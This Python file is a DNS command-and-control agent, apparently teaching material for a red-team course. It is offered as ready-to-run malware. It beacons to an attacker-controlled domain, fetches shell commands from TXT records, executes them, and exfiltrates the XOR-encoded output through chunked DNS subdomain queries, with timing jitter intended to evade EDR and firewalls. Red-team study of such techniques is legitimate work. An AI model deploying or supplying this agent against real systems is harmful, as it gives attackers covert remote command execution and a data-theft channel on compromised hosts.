# c2_frameworks/dns/agent.py
"""
DNS C2 Agent – The Silent Beacon
Runs on any compromised host (even kiosk-locked Windows)
Only outbound traffic: DNS queries to your authoritative server
No callbacks, no HTTP, no open ports → invisible to EDR and NGFW
Exfils data via subdomains, receives commands via TXT records
"""

import socket
import time
import subprocess
import random
import base64
from datetime import datetime

from .utils import (
    dns_safe_base32_encode,
    xor_shuffle,
    chunk_subdomains,
    build_exfil_subdomain,
    generate_session_id
)

class DNSC2Agent:
    def __init__(
        self,
        domain: str,
        resolver: str = "8.8.8.8",          # Use corporate resolver or public
        beacon_interval: int = 300,
        xor_key: bytes = b"30DaysRedTeam"
    ):
        self.domain = domain.rstrip(".")
        self.resolver = resolver
        self.interval = beacon_interval
        self.xor_key = xor_key
        self.session_id = generate_session_id()
        self.last_task_id = None

        print(f"[+] DNS C2 Agent Active")
        print(f"[+] Session ID : {self.session_id}")
        print(f"[+] Domain     : {self.domain}")
        print(f"[+] Resolver   : {self.resolver}\n")

    def execute(self, command: str) -> str:
        """Execute command with timeout and size limit"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120
            )
            output = result.stdout + result.stderr
            return output.strip()[:3900]  # Leave room for encoding
        except Exception as e:
            return f"Error: {str(e)}"

    def exfiltrate(self, data: str):
        """Encode and exfiltrate data via DNS queries"""
        # Compress + encrypt + encode
        compressed = data.encode("utf-8", errors="ignore")
        encrypted = xor_shuffle(compressed, self.xor_key)
        encoded = dns_safe_base32_encode(encrypted)

        chunks = chunk_subdomains(encoded, max_label=60)
        total = len(chunks)

        print(f"[+] Exfiltrating {len(data)} bytes in {total} DNS queries...")

        for i, chunk in enumerate(chunks):
            subdomain = build_exfil_subdomain(
                session_id=self.session_id,
                chunk_id=i,
                total_chunks=total,
                payload_chunk=chunk,
                domain=self.domain
            )
            try:
                socket.gethostbyname(subdomain)  # Fire-and-forget DNS query
                print(f"    → {subdomain}")
                time.sleep(random.uniform(1.8, 4.2))  # Anti-pattern jitter
            except:
                pass  # Expected – no response needed

    def check_for_tasks(self):
        """Query TXT record for pending commands"""
        task_domain = f"task.{self.session_id}.{self.domain}"
        try:
            answers = socket.gethostbyname_ex(task_domain)  # Will fail if no TXT
        except:
            return None

        try:
            # Use resolver directly for TXT
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.resolver]
            answers = resolver.resolve(task_domain, "TXT")
            for rdata in answers:
                txt = "".join(rdata.strings).decode()
                if txt.startswith("cmd:"):
                    return txt[4:]  # Strip "cmd:"
        except:
            return None

    def run(self):
        """Main agent loop – beacon → check tasks → execute → exfil"""
        print("[+] Starting DNS beacon loop...\n")
        while True:
            try:
                # Stage 1: Beacon (simple A query with session)
                beacon = f"beacon.{self.session_id}.{self.domain}"
                try:
                    socket.gethostbyname(beacon)
                except:
                    pass

                # Stage 2: Check for new task
                command = self.check_for_tasks()
                if command and command != self.last_task_id:
                    print(f"[*] New task received: {command}")
                    output = self.execute(command)
                    self.exfiltrate(output)
                    self.last_task_id = command

                # Sleep with jitter
                time.sleep(self.interval + random.uniform(-60, 120))

            except KeyboardInterrupt:
                print("\n[+] Agent stopped.")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(60)


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="DNS C2 Agent")
    parser.add_argument("--domain", required=True, help="Your controlled domain (e.g. redteam30days.com)")
    parser.add_argument("--resolver", default="8.8.8.8", help="Public or internal DNS")
    parser.add_argument("--interval", type=int, default=300, help="Beacon interval")

    args = parser.parse_args()

    agent = DNSC2Agent(
        domain=args.domain,
        resolver=args.resolver,
        beacon_interval=args.interval
    )
    agent.run()